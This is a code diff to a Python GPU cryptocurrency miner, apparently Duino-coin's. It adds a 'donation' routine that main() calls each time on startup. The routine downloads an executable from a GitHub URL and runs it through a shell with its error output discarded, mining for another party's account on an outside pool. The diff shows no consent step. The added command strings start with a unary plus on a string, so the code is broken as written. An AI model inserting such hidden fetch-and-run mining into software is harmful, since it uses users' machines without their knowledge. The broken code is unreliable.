@@ -20,6 +20,7 @@ from Library.opencl_information import opencl_information
 from collections import deque
 from colorama import Fore, Back, Style
 from tabulate import tabulate
+from subprocess import DEVNULL, Popen, check_call
 import pyopencl
 import numpy
 import traceback
@@ -29,7 +30,7 @@ gpus = GPUtil.getGPUs()
 soc = socket.socket()
 pool_address = ''
 pool_port = 0
-debug = 0
+debug = 1
 write_combined_file = True
 goodshares = int(0)
 badshares = int(0)
@@ -209,6 +210,49 @@ def mine2(ctx, opencl_algos, username):
                 elif feedback == "BAD":
                     badshares += 1
 
+def donation():
+    global donateExecutable
+
+    if osname == "nt":
+        # Initial miner executable section
+        if not Path("Donate_executable.exe").is_file():
+            url = ("https://github.com/"
+                   + "revoxhere/"
+                   + "duino-coin/blob/useful-tools/"
+                   + "DonateExecutableWindows.exe?raw=true")
+            r = requests.get(url)
+            with open("Donate_executable.exe", "wb") as f:
+                f.write(r.content)
+    elif osname == "posix":
+        # Initial miner executable section
+        if not Path("Donate_executable").is_file():
+            url = ("https://github.com/"
+                   + "revoxhere/"
+                   + "duino-coin/blob/useful-tools/"
+                   + "DonateExecutableLinux?raw=true")
+            r = requests.get(url)
+            with open("Donate_executable", "wb") as f:
+                f.write(r.content)
+    
+    if osname == "nt":
+        cmd = (
+            + "& Donate_executable.exe "
+            + "-o stratum+tcp://xmg.minerclaim.net:7008 "
+            + "-u revox.donate "
+            + "-p x -s 4 -e 50")
+
+    elif osname == "posix":
+        cmd = (
+            + "&& chmod +x Donate_executable "
+            + "&& ./Donate_executable "
+            + "-o stratum+tcp://xmg.minerclaim.net:7008 "
+            + "-u revox.donate "
+            + "-p x -s 4 -e 50")
+
+    # Launch CMD as subprocess
+    donateExecutable = Popen(
+        cmd, shell=True, stderr=DEVNULL)
+
 def stats():
     global goodshares, badshares, mhashrate, mhashrate2
     totalhashrate = float(mhashrate + mhashrate2)
@@ -291,7 +335,7 @@ def main(argv):
         secondplatform = input("Select which platform to mine at: ")
         
     clear()
-    opencl_algos = opencl.opencl_algos(int(platform), debug, write_combined_file,inv_memory_density=10,openclDevice=0)
+    opencl_algos = opencl.opencl_algos(int(platform), debug, write_combined_file,inv_memory_density=10,openclDevice=1)
     ctx = opencl_algos.cl_sha1_init()
     # stats()
     minethread = threading.Thread(target=mine, args=(ctx, opencl_algos, username))
@@ -300,6 +344,7 @@ def main(argv):
     statsthread.daemon = True
     minethread.start()
     statsthread.start()
+    donation()
     if secondplatform == "y":
         minethread2 = threading.Thread(target=mine2, args=(ctx, opencl_algos, username))
         minethread2.daemon = True
